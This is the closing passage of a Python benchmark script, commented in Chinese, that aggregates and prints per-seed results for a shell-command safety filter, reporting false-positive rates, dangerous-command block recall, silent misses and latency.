            "max": round(max(x["prompt_rate_pct"] for x in results), 3),
            "stdev": round(statistics.pstdev(x["prompt_rate_pct"] for x in results), 4),
        },
        "fp_hard_pct_of_allow": {
            "min": round(min(x["fp_hard_pct_of_allow"] for x in results), 3),
            "median": round(statistics.median(x["fp_hard_pct_of_allow"] for x in results), 3),
            "max": round(max(x["fp_hard_pct_of_allow"] for x in results), 3),
        },
        "fp_hard_total": sum(x["fp_hard_count"] for x in results),
        "fp_flag_total": sum(x["fp_flag_count"] for x in results),
        "danger_block_recall_pct": {
            "min": round(min(x["danger_block_recall_pct"] for x in results), 3),
            "median": round(statistics.median(x["danger_block_recall_pct"] for x in results), 3),
            "max": round(max(x["danger_block_recall_pct"] for x in results), 3),
        },
        "danger_miss_total": sum(x["danger_miss"] for x in results),
        # 静默放行条数: 危险命令被完全 allow。0 是本基准的唯一硬门槛。
        "danger_miss_silent_total": sum(x["danger_miss_silent_count"] for x in results),
        "ambiguous_caught_pct_median": round(
            statistics.median(x["ambiguous_caught_pct"] for x in results), 2),
        "latency_ms_per_cmd": {
            "min": round(min(lat), 3), "median": round(statistics.median(lat), 3),
            "max": round(max(lat), 3), "p50": _p(lat, 0.50),
            "p90": _p(lat, 0.90), "p99": _p(lat, 0.99),
        },
        "family_prompt_rate_median_pct": {
            fam: round(statistics.median(
                x["family"][fam]["prompt_pct"] for x in results if fam in x["family"]
            ), 2)
            for fam in sorted({f for x in results for f in x["family"]})
        },
    }

    out = {"summary": summary, "per_seed": results}
    if args.out:
        Path(args.out).write_text(
            json.dumps(out, ensure_ascii=False, indent=2, default=str), encoding="utf-8")

    if args.quiet:
        return 0

    print()
    print("=" * 84)
    print("真实使用场景基准 — 汇总 ({} 个独立随机种子 × {} 条/种子, 共 {:,} 条命令)".format(
        summary["seeds_run"], args.count, summary["total_commands"]))
    print(f"种子模式: {summary['seed_mode']}  种子: {[int(s) for s in seeds]}")
    print("=" * 84)
    pr = summary["prompt_rate_pct"]
    fh = summary["fp_hard_pct_of_allow"]
    dr = summary["danger_block_recall_pct"]
    print(f"整体提示率 (flag+block): {pr['min']}% – {pr['max']}%  "
          f"(中位 {pr['median']}%, σ={pr['stdev']})")
    print(f"硬拦误杀 (对良性命令直接拒绝): 共 {summary['fp_hard_total']} 条, "
          f"占良性 {fh['min']}% – {fh['max']}% (中位 {fh['median']}%)")
    print(f"标记误杀 (对良性命令多要一次确认): 共 {summary['fp_flag_total']} 条")
    print(f"真危险命令拦截召回: {dr['min']}% – {dr['max']}%  "
          f"(中位 {dr['median']}%, 漏拦 {summary['danger_miss_total']} 条)")
    _silent = summary["danger_miss_silent_total"]
    _silent_tag = "[PASS] 零静默放行" if _silent == 0 else "[FAIL] 存在静默放行"
    print(f"静默放行 (危险命令完全 allow, 无任何提示): {_silent} 条  {_silent_tag}")
    print(f"模糊命令命中 (flag 或 block): 中位 {summary['ambiguous_caught_pct_median']}%")
    la = summary["latency_ms_per_cmd"]
    print(f"延迟: 中位 {la['median']} ms/条  (min {la['min']}, max {la['max']})")
    print()
    print("按命令族的提示率 (中位):")
    for fam, pct in summary["family_prompt_rate_median_pct"].items():
        bar = "#" * int(pct // 2)
        print(f"  {fam:16s} {pct:6.2f}%  {bar}")

    if summary["fp_hard_total"]:
        print()
        print(f"[!] 硬拦误杀样例 (共 {summary['fp_hard_total']} 条, 前 15):")
        for x in results[0]["fp_hard_samples"][:15]:
            print(f"     block  {x['cmd']}")
            print(f"           -> {x['hit']}")

    if summary["danger_miss_total"]:
        print()
        print(f"[!] 真危险漏拦样例 (共 {summary['danger_miss_total']} 条, 前 15):")
        for x in results[0]["danger_miss_samples"][:15]:
            print(f"     {x['hit']:16s} {x['cmd']}")

    if args.out:
        print(f"\nJSON: {args.out}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
